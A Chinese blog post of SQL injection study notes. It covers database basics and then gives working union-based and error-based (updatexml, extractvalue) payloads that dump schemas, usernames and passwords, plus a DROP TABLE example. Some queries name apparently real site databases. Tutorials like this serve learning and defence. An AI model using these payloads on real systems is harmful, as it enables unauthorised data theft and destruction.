class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/" itemprop="url">web安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>网络安全</span></a><a class="article-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web安全</span></a><a class="article-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>SQL注入</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-11-07T14:12:25.000Z" title="发表于 2024-11-07 22:12:25">2024-11-07</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-11-07T14:18:26.696Z" title="更新于 2024-11-07 22:18:26">2024-11-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">10.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>42分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为Universe"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>Universe</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/11/07/SQL%E6%B3%A8%E5%85%A5/#post-comment" tabindex="-1"><span id="twikoo-count"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://img.shalom86012.eu.org/imgs/wallhaven-9mdjx1.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://blog.shalom86012.eu.org/2024/11/07/SQL%E6%B3%A8%E5%85%A5/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/" itemprop="url">web安全</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">网络安全</a><a href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">web安全</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url">SQL注入</a><h1 id="CrawlerTitle" itemprop="name headline">SQL注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Shalom</span><time itemprop="dateCreated datePublished" datetime="2024-11-07T14:12:25.000Z" title="发表于 2024-11-07 22:12:25">2024-11-07</time><time itemprop="dateCreated datePublished" datetime="2024-11-07T14:18:26.696Z" title="更新于 2024-11-07 22:18:26">2024-11-07</time></header><h1 id="1-数据库基础知识"><a href="#1-数据库基础知识" class="headerlink" title="1 数据库基础知识"></a>1 数据库基础知识</h1><h2 id="1-1-MySQL"><a href="#1-1-MySQL" class="headerlink" title="1.1 MySQL"></a>1.1 MySQL</h2><h3 id="1-1-1-简介"><a href="#1-1-1-简介" class="headerlink" title="1.1.1 简介"></a>1.1.1 简介</h3><p>MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。</p>
<blockquote>
<p>关系型数据库：指多张相互连接的二维表组成的数据库，所谓二维表指的就是由行和列组成的</p>
<p>表。例如：Oracle、DB2、SQLServer。</p>
<p>非关系型数据库：不使用固定的表结构存储数据，而是使用键值对、文档、列族或图结构。例如：Redis。</p>
</blockquote>
<h3 id="1-1-2-常见命令"><a href="#1-1-2-常见命令" class="headerlink" title="1.1.2 常见命令"></a>1.1.2 常见命令</h3><h4 id="1-注释"><a href="#1-注释" class="headerlink" title="1) 注释"></a>1) 注释</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种：-- (--%20、--+-)（后面必须加空格）</span><br><span class="line">第二种：#(%23)</span><br></pre></td></tr></table></figure>

<h4 id="2-查询所有数据库"><a href="#2-查询所有数据库" class="headerlink" title="2) 查询所有数据库"></a>2) 查询所有数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br><span class="line">相当于 SELECT schema_name FROM information_schema.SCHEMATA; #SCHEMATA表存储了所有的库信息</span><br><span class="line">select group_concat(schema_name) FROM information_schema.SCHEMATA; #结果拼接成一行</span><br><span class="line"></span><br><span class="line">substr(concat(&#x27;&gt;&gt;&#x27;,(select group_concat(schema_name) FROM information_schema.SCHEMATA),&#x27;&lt;&lt;&#x27;),1,100)</span><br></pre></td></tr></table></figure>

<h4 id="3-查看一个数据库里所有的表"><a href="#3-查看一个数据库里所有的表" class="headerlink" title="3) 查看一个数据库里所有的表"></a>3) 查看一个数据库里所有的表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USE databasename; (eg: USE mysql;)</span><br><span class="line">SHOW TABLES;</span><br><span class="line">eg: SHOW TABLES FROM mysql;</span><br><span class="line"></span><br><span class="line">#查询没有结果，可以把库名换成16进制，不带引号，格式为0x开头，后跟完整16进制</span><br><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema = &#x27;库名database&#x27;;</span><br><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema = database()</span><br><span class="line">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;security&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="4-查询库中（所有的）字段-列"><a href="#4-查询库中（所有的）字段-列" class="headerlink" title="4) 查询库中（所有的）字段&#x2F;列"></a>4) 查询库中（所有的）字段&#x2F;列</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.COLUMNS WHERE table_schema = &#x27;库名database&#x27; and table_name=&#x27;表名&#x27;;</span><br><span class="line">SELECT group_concat(column_name) FROM information_schema.COLUMNS WHERE table_schema = &#x27;security&#x27; and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="5-查询表中的数据："><a href="#5-查询表中的数据：" class="headerlink" title="5) 查询表中的数据："></a>5) 查询表中的数据：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表名</span><br><span class="line">SELECT * FROM 库名.表名; (eg: select * from mysql.user;)</span><br><span class="line">SELECT 字段1,字段2,... FROM 库名.表名；</span><br><span class="line"></span><br><span class="line">SELECT * FROM 库名.表名 WHERE 字段 = &#x27;&#x27; AND 字段 = &#x27;&#x27;; </span><br><span class="line">(eg: select * from mysql.user where user = &#x27;root&#x27;;)</span><br><span class="line">SELECT * FROM 库名.表名 WHERE 字段 = &#x27;&#x27; OR 1 = 1; </span><br><span class="line"></span><br><span class="line">SELECT * FROM 库名.表名 UNION SELECT 1,2,3,...;--当字段数量与后面数字个数相等时，不报错，用于确定字段数量</span><br><span class="line"></span><br><span class="line">select * from qdm178021325_db.admin_login</span><br><span class="line">select group_concat(id,username,logintime,loginip) from qdm178021325_db.admin_login</span><br></pre></td></tr></table></figure>

<h4 id="6-查看当前选择的是哪个库"><a href="#6-查看当前选择的是哪个库" class="headerlink" title="6) 查看当前选择的是哪个库"></a>6) 查看当前选择的是哪个库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br><span class="line"></span><br><span class="line">AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3e3e,(SELECT database()),0x3c3c,FLOOR(RAND(0)*2))xx FROM INFORMATION_SCHEMA.PLUGINS GROUP BY xx)a) #MariaDB数据库payload，和MySQL部分语法相同</span><br></pre></td></tr></table></figure>

<h4 id="7-查看版本："><a href="#7-查看版本：" class="headerlink" title="7) 查看版本："></a>7) 查看版本：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION();</span><br></pre></td></tr></table></figure>

<h4 id="8-查看当前登录数据库的用户："><a href="#8-查看当前登录数据库的用户：" class="headerlink" title="8) 查看当前登录数据库的用户："></a>8) 查看当前登录数据库的用户：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USER();</span><br></pre></td></tr></table></figure>

<h4 id="9-查看数据存储路径："><a href="#9-查看数据存储路径：" class="headerlink" title="9) 查看数据存储路径："></a>9) 查看数据存储路径：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@datadir;</span><br></pre></td></tr></table></figure>

<h4 id="10-查看MySQL安装路径："><a href="#10-查看MySQL安装路径：" class="headerlink" title="10) 查看MySQL安装路径："></a>10) 查看MySQL安装路径：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@basedir;</span><br></pre></td></tr></table></figure>

<h4 id="11-查看MySQL安装的系统："><a href="#11-查看MySQL安装的系统：" class="headerlink" title="11) 查看MySQL安装的系统："></a>11) 查看MySQL安装的系统：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version_compile_os;</span><br></pre></td></tr></table></figure>

<h4 id="12-查看主机名称："><a href="#12-查看主机名称：" class="headerlink" title="12) 查看主机名称："></a>12) 查看主机名称：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@hostname; #例如：LAPTOP-...</span><br></pre></td></tr></table></figure>

<h4 id="13-查看时间"><a href="#13-查看时间" class="headerlink" title="13) 查看时间"></a>13) 查看时间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT NOW();</span><br></pre></td></tr></table></figure>

<h4 id="14-创建库："><a href="#14-创建库：" class="headerlink" title="14) 创建库："></a>14) 创建库：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 库名 CHARSET utf8mb4; </span><br></pre></td></tr></table></figure>

<h4 id="15-创建表："><a href="#15-创建表：" class="headerlink" title="15) 创建表："></a>15) 创建表：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE 库名; </span><br><span class="line">    CREATE TABLE 表名(id INT);</span><br></pre></td></tr></table></figure>

<h4 id="16-删除表："><a href="#16-删除表：" class="headerlink" title="16) 删除表："></a>16) 删除表：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE 表名;</span><br></pre></td></tr></table></figure>

<h4 id="17-修改表："><a href="#17-修改表：" class="headerlink" title="17) 修改表："></a>17) 修改表：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 字段 VARCHAR(32);--添加字段</span><br></pre></td></tr></table></figure>

<h4 id="18-查看表结构："><a href="#18-查看表结构：" class="headerlink" title="18) 查看表结构："></a>18) 查看表结构：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC 表名;</span><br></pre></td></tr></table></figure>

<h4 id="19-插入数据到表中："><a href="#19-插入数据到表中：" class="headerlink" title="19) 插入数据到表中："></a>19) 插入数据到表中：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO 表名 VALUES (1,&quot;张&quot;),(2,&quot;王&quot;),...;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-MSSQL"><a href="#1-2-MSSQL" class="headerlink" title="1.2 MSSQL"></a>1.2 MSSQL</h2><h3 id="1-2-1-简介"><a href="#1-2-1-简介" class="headerlink" title="1.2.1 简介"></a>1.2.1 简介</h3><p>Microsoft SQL Server，是Microsoft公司推出的关系型数据库管理系统。</p>
<blockquote>
<p>Microsoft SQL Server 默认监听的 TCP&#x2F;IP 端口为 1433。</p>
</blockquote>
<h3 id="1-2-2-库结构"><a href="#1-2-2-库结构" class="headerlink" title="1.2.2 库结构"></a>1.2.2 库结构</h3><p>Microsoft SQL Server 服务由一个实例（Instance）和多个数据库（Databases）组成，实例包含了后台线程和占用的内存，默认的系统数据库包括 master、model、msdb、Resource 以及 tempdb。</p>
<table>
<thead>
<tr>
<th>系统数据库</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/databases/master-database?view=sql-server-ver16">master 数据库</a></td>
<td align="left">记录 SQL Server 实例的所有系统级信息。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/databases/msdb-database?view=sql-server-ver16">msdb 数据库</a></td>
<td align="left">用于 SQL Server 代理计划警报和作业。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/databases/model-database?view=sql-server-ver16">model 数据库</a></td>
<td align="left">用作 SQL Server 实例上创建的所有数据库的模板。 对 <strong>model</strong> 数据库进行的修改（如数据库大小、排序规则、恢复模式和其他数据库选项）将应用于以后创建的所有数据库。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/databases/resource-database?view=sql-server-ver16">Resource 数据库</a></td>
<td align="left">一个只读数据库，包含 SQL Server 包括的系统对象。 系统对象在物理上保留在 <strong>Resource</strong> 数据库中，但在逻辑上显示在每个数据库的 <strong>sys</strong> 架构中。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/databases/tempdb-database?view=sql-server-ver16">tempdb 数据库</a></td>
<td align="left">一个工作空间，用于保存临时对象或中间结果集。</td>
</tr>
</tbody></table>
<h2 id="1-3-Oracle"><a href="#1-3-Oracle" class="headerlink" title="1.3 Oracle"></a>1.3 Oracle</h2><h3 id="1-3-1-简介"><a href="#1-3-1-简介" class="headerlink" title="1.3.1 简介"></a>1.3.1 简介</h3><p>Oracle Database，又名 Oracle RDBMS，简称 Oracle。ORACLE数据库系统是美国ORACLE公司（甲骨文）提供的以分布式数据库为核心的一组软件产品，是最流行的客户&#x2F;服务器(CLIENT&#x2F;SERVER)或B&#x2F;S体系结构的数据库之一。比如SilverStream就是基于数据库的一种中间件。</p>
<h1 id="2-web十大漏洞"><a href="#2-web十大漏洞" class="headerlink" title="2 web十大漏洞"></a>2 web十大漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问控制失效（Broken Access Control）</span><br><span class="line">加密失败（Cryptographic Failures）</span><br><span class="line">注入（Injection）</span><br><span class="line">不安全设计（Insecure Design）</span><br><span class="line">安全配置错误（Security Misconfiguration）</span><br><span class="line">脆弱过时组件（Vulnerable and Outdated Component）</span><br><span class="line">识别与认证失败（Identification and Authentication Failure）</span><br><span class="line">软件和数据完整性故障（Software and Data Integrity Failure）</span><br><span class="line">安全日志与检测失败（Security Logging and Monitoring Failure）</span><br><span class="line">服务器端请求伪造（Server—Side Request Forgery）</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/a23549c81dea7dad157e75a9af5435aa.png" alt="img"></p>
<h1 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3 SQL注入"></a>3 SQL注入</h1><h2 id="3-1-SQL注入原理"><a href="#3-1-SQL注入原理" class="headerlink" title="3.1 SQL注入原理"></a>3.1 SQL注入原理</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<h2 id="3-2-查找注入点位置"><a href="#3-2-查找注入点位置" class="headerlink" title="3.2 查找注入点位置"></a>3.2 查找注入点位置</h2><p>前端页面上所有提交数据的地方，不管是登录、注册、留言板、评论区、分页等，只要是提交数据给后台，后台拿着数据和数据库交互了，那么这个地方就可能存在注入点。</p>
<h2 id="3-3-SQL注入分类"><a href="#3-3-SQL注入分类" class="headerlink" title="3.3 SQL注入分类"></a>3.3 SQL注入分类</h2><h3 id="3-3-1-数据类型分类"><a href="#3-3-1-数据类型分类" class="headerlink" title="3.3.1 数据类型分类"></a>3.3.1 数据类型分类</h3><h4 id="1-数字型"><a href="#1-数字型" class="headerlink" title="1) 数字型"></a>1) 数字型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xx or 1=1</span><br><span class="line"># 加单引号，URL：xxx.xxx.xxx/xxx.php?id=3&#x27;；</span><br><span class="line">对应的sql：select * from table where id=3&#x27; 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</span><br><span class="line"># 加and 1=1 ，URL：xxx.xxx.xxx/xxx.php?id=3 and 1=1；</span><br><span class="line">对应的sql：select * from table where id=3 and 1=1 语句执行正常，与原始页面没有差异；</span><br><span class="line"># 加and 1=2，URL：xxx.xxx.xxx/xxx.php?id=3 and 1=2；</span><br><span class="line">对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</span><br></pre></td></tr></table></figure>

<h4 id="2-字符型"><a href="#2-字符型" class="headerlink" title="2) 字符型"></a>2) 字符型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or 1=1 #</span><br><span class="line"># 加单引号：select * from table where name=&#x27;admin&#x27;&#x27;;</span><br><span class="line">由于加单引号后变成三个单引号，则无法执行，程序会报错；</span><br><span class="line"># 加&#x27; and 1=1 此时sql语句为：select * from table where name=&#x27;admin&#x27; and 1=1&#x27;;</span><br><span class="line">无法进行注入，还需要通过注释符号将其绕过。因此，构造语句为：select * from table where name =&#x27;admin&#x27; and 1=1 --+-&#x27;,可成功执行返回结果正确；</span><br><span class="line"># 加and 1=2--%20- 此时sql语句为：select * from table where name=&#x27;admin&#x27; and 1=2--+-&#x27;则会报错。</span><br><span class="line">如果满足以上三点，可以判断该url为字符型注入。</span><br><span class="line"></span><br><span class="line"># 判断列数</span><br><span class="line">?id=1&#x27; order by 4 # 报错</span><br><span class="line">?id=1&#x27; order by 3 # 没有报错，说明存在3列</span><br><span class="line"># 爆数据库</span><br><span class="line">?id=-1&#x27; union select 1,database(),3 --+-;</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 FROM information_schema.SCHEMATA #</span><br><span class="line"># 爆表名</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;数据库名&#x27;</span><br><span class="line">?id=-1&#x27; union select 1,table_name,3 from information_schema.tables where table_schema = database() limit 0,1 --+- #第0+1个，限制数量为1</span><br><span class="line"># 爆字段</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+-</span><br><span class="line"># 爆数据值</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users --+-</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(username,0x7e,password),3 from users --+- # 0x7e是~的URL编码。</span><br></pre></td></tr></table></figure>

<h4 id="3-搜索型"><a href="#3-搜索型" class="headerlink" title="3) 搜索型"></a>3) 搜索型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx%&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<h4 id="4-xx型"><a href="#4-xx型" class="headerlink" title="4) xx型"></a>4) xx型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;) or 1=1 #</span><br></pre></td></tr></table></figure>

<h4 id="5-Json类型（额外加的）"><a href="#5-Json类型（额外加的）" class="headerlink" title="5) Json类型（额外加的）"></a>5) Json类型（额外加的）</h4><p>正常：<code>&#123; &quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30 &#125;</code></p>
<p>恶意：<code>&#123; &quot;name&quot;: &quot;John&#39;; DROP TABLE users;-- &quot;, &quot;age&quot;: 30 &#125;</code></p>
<h3 id="3-3-2-提交方式分类"><a href="#3-3-2-提交方式分类" class="headerlink" title="3.3.2 提交方式分类"></a>3.3.2 提交方式分类</h3><p>get</p>
<p>post</p>
<p>cookie</p>
<h3 id="3-3-3-请求数据位置分类"><a href="#3-3-3-请求数据位置分类" class="headerlink" title="3.3.3 请求数据位置分类"></a>3.3.3 请求数据位置分类</h3><p>请求行</p>
<p>请求头</p>
<p>请求体</p>
<h3 id="3-3-4-报错注入"><a href="#3-3-4-报错注入" class="headerlink" title="3.3.4 报错注入"></a>3.3.4 报错注入</h3><p>页面的报错信息中返回了数据库的相关信息。</p>
<blockquote>
<p>例如，返回了数据库用户信息：</p>
<p>XPATH syntax error:‘root@localhost’</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Updatexml(); #MySQL对XML文档数据进行查询和修改的XPATH函数</span><br><span class="line">Updatexml(XML_document, XPath_string, new_value); #针对xml数据的内容替换函数</span><br><span class="line">eg:</span><br><span class="line">updatexml(&#x27;hello&#x27;, concat(&#x27;&gt;&gt;&#x27;,(select version()),&#x27;&lt;&lt;&#x27;),&#x27;hi&#x27;) --+</span><br><span class="line">and updatexml(1, concat(&#x27;&gt;&gt;&#x27;,(select version()),&#x27;&lt;&lt;&#x27;),1) --+</span><br><span class="line">or updatexml(1, concat(&#x27;&gt;&gt;&#x27;,(select version()),&#x27;&lt;&lt;&#x27;),1) #</span><br><span class="line">#concat拼接&gt;&gt;version&lt;&lt;,前后两个参数要么直接写数字，要么必须用单引号扩着</span><br><span class="line">updatexml(1, concat(&#x27;&gt;&gt;&#x27;,(select database()),&#x27;&lt;&lt;&#x27;),1) --+ #有些数据库名称不一定是MySQL，可能是自定义的</span><br><span class="line">updatexml(1, substr(concat(&#x27;&gt;&gt;&#x27;,(select group_concat(schema_name) FROM information_schema.SCHEMATA),&#x27;&lt;&lt;&#x27;),1,100),1) --+ #截取数据库名</span><br><span class="line">updatexml(1, substr(concat(&#x27;&gt;&gt;&#x27;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;jacobs_mddata&#x27;),&#x27;&lt;&lt;&#x27;),1,100),1) --+ #查询指定数据库的表并截取</span><br><span class="line">updatexml(1, substr(concat(&#x27;&gt;&gt;&#x27;,(SELECT group_concat(column_name) FROM information_schema.COLUMNS WHERE table_schema = &#x27;jacobs_mddata&#x27; and table_name=&#x27;modern_navi&#x27;),&#x27;&lt;&lt;&#x27;),1,100),1) --+ #查询指定数据库指定表的所有字段</span><br><span class="line">updatexml(1, substr(concat(&#x27;&gt;&gt;&#x27;,(select group_concat(id,name,open,anker) from jacobs_mddata.modern_c),&#x27;&lt;&lt;&#x27;),1,100),1) --+ #查询指定表的数据</span><br><span class="line"></span><br><span class="line">extractvalue(); #MySQL对XML文档数据进行查询的XPATH函数</span><br><span class="line">extractvalue(XML_document, XPath_string)</span><br><span class="line">eg:</span><br><span class="line">extractvalue(&#x27;hello&#x27;, concat(&#x27;!&#x27;, (select @@Version)));</span><br><span class="line"></span><br><span class="line">floor(); #MySQL中用来取整的函数</span><br></pre></td></tr></table></figure>

